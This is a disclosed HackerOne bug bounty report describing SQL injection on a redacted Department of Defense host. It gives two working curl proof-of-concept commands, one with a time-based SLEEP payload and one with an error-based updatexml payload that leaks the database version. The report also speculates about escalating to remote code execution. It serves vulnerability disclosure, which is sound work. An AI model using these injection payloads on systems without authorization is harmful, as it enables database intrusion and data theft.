# SQL Injection on https://████████/

## Report Details
- **Report ID**: 232378
- **URL**: https://hackerone.com/reports/232378
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-05-27T07:15:51.436Z
- **Disclosed**: 2022-05-12T19:59:55.610Z

## Reporter
- **Username**: cdl
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
https://████ is vulnerable to SQL Injection.

**Description:**
The `███████` parameter in `https://█████████/██████` does not properly sanitize input, thus allowing an attacker to execute SQL queries on the server!

## Impact
This is a **high impact** vulnerability! I saw a list of tables which I'm guessing contain confidential information such as emails, usernames, passwords, etc! Attackers could likely leverage this to Remote Code Execution by finding admin credentials, then gaining unauthorized access to an admin panel! 

## Step-by-step Reproduction Instructions
#### Proof of Concept #1:
1. Open up your terminal!
2. Paste this command 

```
curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://██████/██████████?█████████=K' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_ga=GA1.2.2009424950.1494732845; PHPSESSID=35472be86b20b8a7f8c15737a8977f49' \
    --data-binary $'█████=K*\' OR SLEEP(10) AND \'aSgl\'=\'aSgl&sid=35472be86b20b8a7f8c15737a8977f49&emailid=███████&emailid2=█████████' \
    $'https://██████/████████'
```
3. Now the server will sleep for 10 seconds and then respond! 


#### Proof of Concept #2: 
```
curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://██████/███████?█████=K' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_ga=GA1.2.2009424950.1494732845; PHPSESSID=35472be86b20b8a7f8c15737a8977f49' \
    --data-binary $'█████=K*\' OR updatexml(null,concat(0x3a3a,version()),null) AND \'aSgl\'=\'aSgl&sid=35472be86b20b8a7f8c15737a8977f49&emailid=█████████&emailid2=██████████' \
    $'https://██████/███'
```
You will see: "<br><br>You have this list added to your current optionsXPATH syntax error: '::`████`'"
which is the MySQL version! 

**information:**
Current User: `███████@localhost`
Databases: `█████`
Version: `███`

## Suggested Mitigation/Remediation Actions
Sanitize sanitize sanitize!!

Thanks as always ;)
-Corben Douglas (@sxcurity)

## Attachments
No attachments
